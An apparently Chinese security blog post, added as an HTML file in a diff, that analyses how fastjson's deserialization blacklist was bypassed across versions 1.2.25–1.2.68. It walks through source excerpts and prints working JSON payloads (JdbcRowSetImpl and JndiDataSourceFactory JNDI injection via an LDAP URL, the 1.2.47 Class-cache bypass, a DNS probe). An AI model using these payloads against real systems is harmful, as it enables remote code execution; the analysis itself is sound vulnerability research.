@@ -1,0 +1,455 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>fastjson黑白名单、黑名单绕过 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="fastjson黑白名单、黑名单绕过 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="fastjson-1.2.25
+在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType ..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              fastjson黑白名单、黑名单绕过
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-22
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="fastjson-1225">fastjson-1.2.25</h1>
+<p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。<br>
+其逻辑是如果autoTypeSupport为false时尽管已经将该类加载完毕，也会抛出异常，而autoTypeSupport为True时只是拦截了基于黑名单的类。</p>
+<blockquote>
+<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.41<br>
+描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。</p>
+</blockquote>
+<p>安全更新主要集中在 <code>com.alibaba.fastjson.parser.ParserConfig</code>，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。<br>
+<img src="https://1jzz.github.io/post-images/1650635691042.png" alt="" loading="lazy"><br>
+其中黑名单 denyList 包括：</p>
+<pre><code>bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
+org.springframework
+</code></pre>
+<p>默认开启checkAutoType(false)黑白名单机制的处理逻辑：<br>
+如果以黑名单中的包名开头的类则会抛出异常，如果以白名单中的包名开头则进行加载，如果包名不在白名单中也不在黑名单中的话最后还是会抛出异常。</p>
+<pre><code class="language-java">if (!this.autoTypeSupport) {
+    String accept;
+    int i;
+    for(i = 0; i &lt; this.denyList.length; ++i) {
+        accept = this.denyList[i];
+        if (className.startsWith(accept)) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+    }
+    
+    for(i = 0; i &lt; this.acceptList.length; ++i) {
+        accept = this.acceptList[i];
+        if (className.startsWith(accept)) {
+            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            }
+            
+            return clazz;
+        }
+  }
+</code></pre>
+<p>但checkAutoType为True时，也就是只开启了黑名单机制时调用TypeUtils.loadClass存在逻辑错误：<br>
+如果包名以[或者L开头以;结尾则会取出其中的全限定名，这样就绕过了前面黑名单的匹配机制，所以在只开启了黑名单机制的情况下可以进行绕过。</p>
+<pre><code class="language-java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) {
+    if (className != null &amp;&amp; className.length() != 0) {
+        Class&lt;?&gt; clazz = (Class)mappings.get(className);
+        if (clazz != null) {
+            return clazz;
+        } else if (className.charAt(0) == '[') {
+            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+            return Array.newInstance(componentType, 0).getClass();
+        } else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
+            String newClassName = className.substring(1, className.length() - 1);
+            return loadClass(newClassName, classLoader);
+        } else {
+.......            
+</code></pre>
+<p>测试payload：</p>
+<pre><code class="language-java">ParserConfig config = new ParserConfig();
+config.setAutoTypeSupport(true);
+
+String json = &quot;{\n&quot; +
+        &quot;  \&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot; +
+        &quot;  \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/#Calc\&quot;,\n&quot; +
+        &quot;  \&quot;autoCommit\&quot;:\&quot;false\&quot;\n&quot; +
+        &quot;}&quot;;
+System.out.println(json);
+JSON.parseObject(json, Object.class, config);
+</code></pre>
+<pre><code class="language-json">{
+  &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,
+  &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;,
+  &quot;autoCommit&quot;:false
+}
+</code></pre>
+<h1 id="fastjson-1243">fastjson-1.2.43</h1>
+<blockquote>
+<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.43<br>
+描述：上有政策，下有对策。在 L、; 被进行了限制后，安全研究人员将目光转向了 [。</p>
+</blockquote>
+<p>这里针对1.2.25中漏洞修复的思路是将传入的typeName同时赋值给className，先用hash来检测className是否以L开头;结尾，如果是这样的话就进行截取全限定名，对className进行黑名单匹配，如果使用双写的话传入TypeUtils.loadClass方法的typeName无法绕过。但是这里没有对[进行检测，所以可以使用[进行绕过黑名单检测。<br>
+<img src="https://1jzz.github.io/post-images/1650635703860.png" alt="" loading="lazy"><br>
+但是在全限定名前加上了[之后抛出了异常：<br>
+<img src="https://1jzz.github.io/post-images/1650635712255.png" alt="" loading="lazy"><br>
+代表pos45上预期应该是&quot;[&quot;，而不是&quot;,&quot;，可能是在前面加上[之后需要紧跟数组对象，经过测试以下payload均可使用：</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[{,
+  &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;,
+  &quot;autoCommit&quot;:false
+}
+{
+  &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,
+  {&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;,
+  &quot;autoCommit&quot;:false
+}
+{
+  &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[{
+  &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;,
+  &quot;autoCommit&quot;:false
+]}}
+</code></pre>
+<h1 id="fastjson-1244">fastjson-1.2.44</h1>
+<p>这次更新主要解决了[绕过黑名单</p>
+<blockquote>
+<p>影响版本： fastjson = 1.2.44<br>
+描述：在此版本将 [ 也进行修复了之后，由字符串处理导致的黑名单绕过也就告一段落了。</p>
+</blockquote>
+<p>我们查看一下checkAutoType方法的逻辑，对第一个字符进行哈希检测，是否以&quot;[&quot;开头，或者以&quot;;&quot;结尾，如果哈希相等则直接抛出异常。<br>
+<img src="https://1jzz.github.io/post-images/1650635720835.png" alt="" loading="lazy"><br>
+此版本有一个不在黑名单的类可以触发JNDI注入，从而绕过了黑名单。JndiDataSourceFactory类位于<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>，存在于mybatis依赖中。<br>
+其setProperties()方法调用了InitialContext类的lookup方法从而可以进行JNDI注入。</p>
+<p>其中传入setProperties()方法的参数是一个Properties类，在fastjson中需要使用{}来表示对象，<code>properties.getProperty(&quot;initial_context&quot;)</code>是传入InitialContext.lookup()方法的参数，<br>
+payload：</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+  &quot;properties&quot;:{
+    &quot;initial_context&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;,
+    &quot;data_source&quot;:&quot;1jzz&quot;
+  }
+}
+{
+  &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+  &quot;properties&quot;:{
+    &quot;data_source&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;
+  }
+}
+</code></pre>
+<h1 id="fastjson-1247">fastjson-1.2.47</h1>
+<p>在fastjson到1.2.47版本时，爆出了最为严重的漏洞，可以在不开启AutoTypeSupport(false)的情况下进行反序列化的利用。之前的绕过都是基于AutoTypeSupport为true的情况下才能进行绕过。</p>
+<blockquote>
+<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport<br>
+影响版本：1.2.33 &lt;= fastjson &lt;= 1.2.47<br>
+描述：作者删除了一个 fastjson 的测试文件：https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ，里面包含了这次通杀漏洞的 payload。</p>
+</blockquote>
+<p>fastjson在AutoTypeSupport为True时黑名单的判断条件：</p>
+<ul>
+<li>传入的类名在黑名单中</li>
+<li>TypeUtils.mappings中没有这个类(这个逻辑导致了1.2.32之前的版本(autoTypeSupport为True时)将会受到影响)</li>
+</ul>
+<p>fastjson在AutoTypeSupport默认为False时黑白名单的判断条件。<br>
+抛出异常：</p>
+<ul>
+<li>只要传入的类名在黑名单中就会抛出异常</li>
+</ul>
+<p>加载类：</p>
+<ul>
+<li>只有传入的类名在白名单才进行加载</li>
+</ul>
+<p>在这部分无法绕过，所以我们关注的点是在黑白名单判断之前如果变量clazz为空时就会在TypeUtils.mappings 中和 this.deserializers.findClass 中尝试查找要反序列化的类，如果找到了就直接return，这就避开下面AutoTypeSupport为False的黑名单白名单检测。<br>
+<img src="https://1jzz.github.io/post-images/1650635732257.png" alt="" loading="lazy"><br>
+this.deserializers是一个IdentityHashMap类，其字段buckets是用来存储Class对象的，如果可以调用其put方法添加一个可以利用的恶意类Class对象，就可以绕过黑名单白名单检测。<br>
+<img src="https://1jzz.github.io/post-images/1650635738860.png" alt="" loading="lazy"><br>
+有三个方法可以对buckets字段进行put，但是第一个方法无参，无法控制。第二个方法在调用put方法前都会对包名进行判断，无法控制。第三个方法则只被第一和第二个方法调用，也无法调用。<br>
+既然无法控制this.deserializers，那我们可以尝试控制TypeUtils.mappings。首先，mappings字段是ConcurrentHashMap类对象，通过调用其put方法添加键值对，通过get方法获取key对应的值。<br>
+调用了mappings.put方法的的方法有两个：</p>
+<ul>
+<li><code>TypeUtils.loadClass()</code>：首先通过mappings.get()方法获取其Class对象，如果可以获取则直接返回，如果获取不到则判断是否ClassLoader，如果有ClassLoader则进行加载并且put到mappings中，进行return</li>
+<li><code>TypeUtils.addBaseClassMappings()</code>：为无参函数，无法进行控制</li>
+</ul>
+<p>也就是说我们只需要控制<code>TypeUtils.loadClass()</code>中的参数，加载黑名单中的类，就可以将这个类put到mappings中，然后就可以绕过checkAutoType方法的黑白名单检测。<br>
+接下来，我们就需要去找调用了TypeUtils.loadClass()方法的方法，注意这里的loadClass方法有三个重载方法。</p>
+<ul>
+<li><code>loadClass(String className, ClassLoader classLoader)</code></li>
+</ul>
+<p>在MiscCodec.deserialze()方法中调用，传入的clazz参数为Class类，而需要加载的类需要满足一些条件然后调用DefaultJSONParser.parse()方法获取</p>
+<ul>
+<li><code>loadClass(String className, ClassLoader classLoader, boolean cache)</code></li>
+</ul>
+<p>均在ParserConfig.checkAutoType()方法中调用，无法控制。</p>
+<ul>
+<li><code>loadClass(String className)</code></li>
+</ul>
+<p>在MiscCodec.deserialze()方法中调用，但是传入的String不可控。<br>
+可以看到Class类的deserializers是MiscCodec类实例：<br>
+<img src="https://1jzz.github.io/post-images/1650635747144.png" alt="" loading="lazy"><br>
+接下来我们指定Class类看看其调用流程。</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;:&quot;java.lang.Class&quot;,
+  &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+}
+</code></pre>
+<p>当通过checkAutoType方法加载了Class<Class>类之后就会调用config.getDeserializer方法来获取其处理类，Class类的处理类就是MiscCodec类，然后会调用其deserialze方法，将clazz也就是加载完的Class类以及传入this(也就是当前的)DefaultJSONParser对象。<br>
+前面有个逻辑判断，已经找到了key为@type的字段，接着往下找&quot;,&quot;，如果得到的符号为&quot;}&quot;则继续往下找&quot;,&quot;，然后返回该Class类的实例对象。如果得到的符号为&quot;,&quot;，则调用对应该类对应的deserializer类的deserialze方法，我们这里的Class类对应的deserializer类为MiscCodec，所以就调用<code>MiscCodec.deserialze()</code>方法。<br>
+<img src="https://1jzz.github.io/post-images/1650635754155.png" alt="" loading="lazy"><br>
+在调用MiscCodec.deserialze()方法的时候，parser的resolveStatus字段要为DefaultJSONParser.TypeNameRedirect，而在上一张图片中可以看到，在调用deserialze方法之前已经将resolveStatus的值设置成了DefaultJSONParser.TypeNameRedirect。<br>
+上面我们讲了找到了key为@type之后的逻辑判断，此时我们的token现在已经找到了&quot;,&quot;，接着调用了<code>parser.accept()</code>方法，在该方法中又调用了lexer.nextToken()方法来查找下一个token(此时的token是16，也就是',')，找到的token为&quot;，然后调用了scanString()方法来获取其中的值并变更token的值(LITERAL_STRING)，这里我们传入的值为val。<br>
+<img src="https://1jzz.github.io/post-images/1650635759780.png" alt="" loading="lazy"><br>
+先判断token的值是否为LITERAL_STRING，接着调用lexer.stringVal()方法来获取其值(也就是val)，这里的key值需要为val才能成功赋值给objVal。<br>
+调用了lexer.nextToken()方法，得到下一个符号为&quot;:&quot;，token更改为17(COLON)，然后调用parser.accept(JSONToken.COLON)方法进行验证，验证成功即获取下一个token。接着调用objVal = parser.parse()方法获取key为value的值，也就是我们需要缓存的恶意类。最后调用parser.accept(JSONToken.RBRACE)方法来确认该对象是否结束(token为&quot;}&quot;)，如果没有结束就会抛出异常。下面这样的例子就会抛出异常：</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;:&quot;java.lang.Class&quot;,
+  &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+  &quot;test&quot;:&quot;1jzz&quot;
+}
+</code></pre>
+<p><img src="https://1jzz.github.io/post-images/1650635766661.png" alt="" loading="lazy"><br>
+给objVal赋值之后，判断其值是否为String，并将其值赋给了strVal。我们的最终目的是调用TypeUtils.loadClass方法缓存恶意类(需要开启缓存)，使其绕过黑白名单验证，这里传入的clazz对象为Class类时就会调用该方法加载类名为strVal也就是objVal的类。<br>
+<img src="https://1jzz.github.io/post-images/1650635772694.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1650635778873.png" alt="" loading="lazy"><br>
+但是最后进行toString时会抛出异常，String类型不能转换为JSONObject类型，在外面套一层{}，作为JSONObject对象就可以解决(这里理解的有点模糊)<br>
+<img src="https://1jzz.github.io/post-images/1650635787276.png" alt="" loading="lazy"></p>
+<pre><code class="language-json">{
+  &quot;1jzz&quot;:{
+    &quot;@type&quot;:&quot;java.lang.Class&quot;,
+    &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+  }
+}
+</code></pre>
+<p>最终绕过payload：</p>
+<pre><code class="language-json">{
+  &quot;1jzz&quot;:{
+    &quot;@type&quot;:&quot;java.lang.Class&quot;,
+    &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+  },
+  &quot;test&quot;:{
+    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/#Calc&quot;,
+    &quot;autoCommit&quot;:false
+  }
+}
+</code></pre>
+<h1 id="fastjson-1268">fastjson-1.2.68</h1>
+<p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 MiscCodec 处理 Class 类的地方，设置了cache 为 false ，并且 loadClass 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。<br>
+但是在 1.2.68 版本出现了新的漏洞利用方式。</p>
+<blockquote>
+<p>影响版本：fastjson &lt;= 1.2.68<br>
+描述：利用 expectClass 绕过 checkAutoType() ，实际上也是为了绕过安全检查的思路的延伸。主要使用 Throwable 和 AutoCloseable 进行绕过。</p>
+</blockquote>
+<p>在fastjson1.2.68中，新增了一个safemode模式，如果应用程序开启safemode并且传入的Feature的mask和safemodemask一致的话就会直接抛出异常，如果不是白名单中的类的话就会直接抛出异常。<br>
+主要的代码逻辑：<br>
+如果找到一个在fastjson中的白名单类，找到可以控制checkAutoType()方法的参数，传入expectClass，并且传入一个子类clazz并且这个子类不是java.util.HashMap，这样的话就能直接return clazz，就可以调用这个类中具有危险操作的setter/getter/static block/constructor。<br>
+这种绕过方式是可以绕过AutoTypeSupport为false的情况的。<br>
+<img src="https://1jzz.github.io/post-images/1650635795316.png" alt="" loading="lazy"><br>
+寻找入口方法：<br>
+看到这几个Derserializer类的deserialze方法可以回想起fastjson1.2.47绕过中通过MiscCodec.deserialze()方法缓存恶意类绕过黑白名单匹配机制，而这里也是通过传入对应的类从而调用JavaBeanDeserializer.deserialze()方法或者ThrowableDeserializer.deserialze()方法绕过黑白名单匹配机制。<br>
+<img src="https://1jzz.github.io/post-images/1650635801820.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1650635809523.png" alt="" loading="lazy"><br>
+在ParserConfig类中的getDeserializer方法，如果传入的clazz参数是Throwable的子类就会new一个ThrowableDeserializer对象进行return。<br>
+<img src="https://1jzz.github.io/post-images/1650635814342.png" alt="" loading="lazy"><br>
+这里埋一个坑，只是简单的了解了如果去找到其利用方式，具体的利用链并没有写，暂时不具体进行分析，之后还需要再回过头来研究一下。</p>
+<h1 id="探测">探测</h1>
+<p>这里使用<code>java.net.URL</code>类进行探测，该类在白名单中，如果得到接收到结果的话就可以进一步进行测试。</p>
+<pre><code class="language-json">{
+  {
+  &quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://xxxxx.ceye.io&quot;
+  }:&quot;1jzz&quot;
+}
+</code></pre>
+<p>利用过程是和URLDNS差不多，在将URL对象put到HashMap中会对key进行hash，又调用了hashCode方法，URLStreamHandler.hashCode方法调用了getHostAddress方法获取域名的ip。</p>
+<h1 id="参考">参考</h1>
+<p><a href="https://su18.org/post/fastjson">https://su18.org/post/fastjson</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fastjson-1225">fastjson-1.2.25</a></li>
+<li><a href="#fastjson-1243">fastjson-1.2.43</a></li>
+<li><a href="#fastjson-1244">fastjson-1.2.44</a></li>
+<li><a href="#fastjson-1247">fastjson-1.2.47</a></li>
+<li><a href="#fastjson-1268">fastjson-1.2.68</a></li>
+<li><a href="#%E6%8E%A2%E6%B5%8B">探测</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/MMRqtXi1S/">
+              <h3 class="post-title">
+                JNDI注入之高版本jdk绕过
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
